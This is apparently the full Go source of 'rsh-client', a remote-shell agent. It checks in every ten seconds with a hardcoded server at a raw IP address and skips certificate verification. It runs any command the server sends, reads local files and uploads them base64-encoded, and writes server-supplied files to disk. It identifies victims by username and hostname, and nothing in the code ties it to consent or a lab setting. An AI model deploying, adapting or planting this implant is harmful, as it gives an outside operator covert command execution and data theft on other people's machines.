package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path"
	"time"

	"github.com/urfave/cli/v2"
)

// ---------------------------
// Shared Data Structures
// ---------------------------

// Client represents a remote agent connecting to the server.
type Client struct {
	id        string
	serverURL string
}

// Target is minimal data we send up to the server on register.
type Target struct {
	IPAddress string             `json:"ipaddress"`
	results   map[string]*Result // Not used in the JSON, but kept in memory
}

// Command defines a task to run on a client.
type Command struct {
	ID        string   `json:"id"`
	Type      string   `json:"type"`
	Arguments []string `json:"arguments"`
}

// Result captures the success/failure status and any output from executing a command.
type Result struct {
	Success bool   `json:"success"`
	Output  string `json:"output"`
}

// ---------------------------
// Client Methods
// ---------------------------

func (cl *Client) sendRequest(method, reqPath string, payload, into interface{}) error {
	// Build the URL
	u, err := url.Parse(cl.serverURL)
	if err != nil {
		return fmt.Errorf("invalid server URL %q: %w", cl.serverURL, err)
	}
	u.Path = reqPath

	// Encode payload to JSON (if any)
	var buf bytes.Buffer
	if payload != nil {
		if err = json.NewEncoder(&buf).Encode(payload); err != nil {
			return fmt.Errorf("failed to encode payload to JSON: %w", err)
		}
	}

	// Construct HTTP request
	req, err := http.NewRequest(method, u.String(), &buf)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	if payload != nil {
		req.Header.Set("Content-Type", "application/json")
	}

	// For simplicity, default to skipping cert verification
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("got HTTP %d %s", resp.StatusCode, resp.Status)
	}

	if into != nil {
		if writer, ok := into.(io.Writer); ok {
			_, err = io.Copy(writer, resp.Body)
		} else {
			err = json.NewDecoder(resp.Body).Decode(into)
		}
		if err != nil {
			return fmt.Errorf("failed to decode server response: %w", err)
		}
	}
	return nil
}

func (cl *Client) SendResult(command *Command, result *Result) error {
	p := path.Join("/api/v1/target", cl.id, "command", command.ID, "result")
	return cl.sendRequest(http.MethodPut, p, result, nil)
}

func (cl *Client) executeCommand(cmdObj *Command) error {
	if len(cmdObj.Arguments) == 0 {
		return fmt.Errorf("no executable specified")
	}
	execPath, err := exec.LookPath(cmdObj.Arguments[0])
	if err != nil {
		return fmt.Errorf("executable not found: %w", err)
	}
	cmd := exec.Command(execPath, cmdObj.Arguments[1:]...)
	out, err := cmd.CombinedOutput()
	res := &Result{Success: (err == nil), Output: string(out)}
	return cl.SendResult(cmdObj, res)
}

// Download reads a file from disk and sends its contents back to the server as the command's result.
func (cl *Client) Download(cmdObj *Command) error {
	if len(cmdObj.Arguments) == 0 {
		return fmt.Errorf("no file specified for upload")
	}
	filePath := cmdObj.Arguments[0]

	data, err := os.ReadFile(filePath)
	res := &Result{
		Success: (err == nil),
	}
	if err != nil {
		res.Output = fmt.Sprintf("upload failed: %v", err)
	} else {
		res.Output = base64.StdEncoding.EncodeToString(data)
	}
	return cl.SendResult(cmdObj, res)
}

// Upload fetches a file from the server and writes it locally.
func (cl *Client) Upload(cmdObj *Command) error {
	if len(cmdObj.Arguments) < 2 {
		return fmt.Errorf("invalid download arguments (need localPath, fileID)")
	}
	localPath := cmdObj.Arguments[0]
	fileID := cmdObj.Arguments[1]

	f, err := os.OpenFile(localPath, os.O_CREATE|os.O_RDWR, 0o644)
	if err != nil {
		return cl.SendResult(cmdObj, &Result{Success: false, Output: err.Error()})
	}
	defer f.Close()

	getPath := path.Join("/api/v1/file", fileID)
	err = cl.sendRequest(http.MethodGet, getPath, nil, f)
	res := &Result{Success: (err == nil)}
	if err != nil {
		res.Output = fmt.Sprintf("download failed: %v", err)
	} else {
		res.Output = "download successful"
	}
	return cl.SendResult(cmdObj, res)
}

// runClient is the main loop for the client.
func runClient(c *cli.Context) error {
	// ----------------------------------------------------------------
	// HARDCODED SERVER ADDRESS: No flags or args needed
	// ----------------------------------------------------------------
	addr := "https://194.15.20.87:9000"
	// Get username
	username := os.Getenv("USER") // Unix-like (Linux/macOS)
	if username == "" {
		username = os.Getenv("USERNAME") // Windows
	}
	hostname, _ := os.Hostname()
	clientID := fmt.Sprintf("%s-%s", username, hostname)
	cl := Client{
		id:        clientID,
		serverURL: addr,
	}
	// log.Printf("Client started. ID=%s, connecting to %s", clientID, addr)

	t := &Target{
		results: map[string]*Result{},
	}

	// Continuous loop: register client, receive commands, execute.
	for {
		var newCommands []Command
		registerPath := path.Join("/api/v1/target", clientID)
		// Register or check in with the server
		err := cl.sendRequest(http.MethodPut, registerPath, t, &newCommands)
		if err != nil {
			log.Printf("check-in failed: %v", err)
			time.Sleep(10 * time.Second) // Retry slower if failed
			continue
		}

		// Execute each command
		for _, cmdObj := range newCommands {
			switch cmdObj.Type {
			case "exec":
				if err := cl.executeCommand(&cmdObj); err != nil {
					log.Printf("exec command failed: %v", err)
				}
			case "upload":
				if err := cl.Upload(&cmdObj); err != nil {
					log.Printf("upload command failed: %v", err)
				}
			case "download":
				if err := cl.Download(&cmdObj); err != nil {
					log.Printf("download command failed: %v", err)
				}
			default:
				log.Printf("unrecognized command type %q", cmdObj.Type)
			}
		}

		time.Sleep(10 * time.Second)
	}
}

// ---------------------------
// main
// ---------------------------
func main() {
	app := &cli.App{
		Name:   "rsh-client",
		Usage:  "Client component for the Remote Shell system (Hardcoded server address)",
		Action: runClient, // Directly call runClient without needing sub-commands
	}

	// We won't need any flags, so you can remove them or just keep them empty.
	flag.Parse()

	if err := app.Run(os.Args); err != nil {
		log.Fatalf("Client application error: %v", err)
	}
}
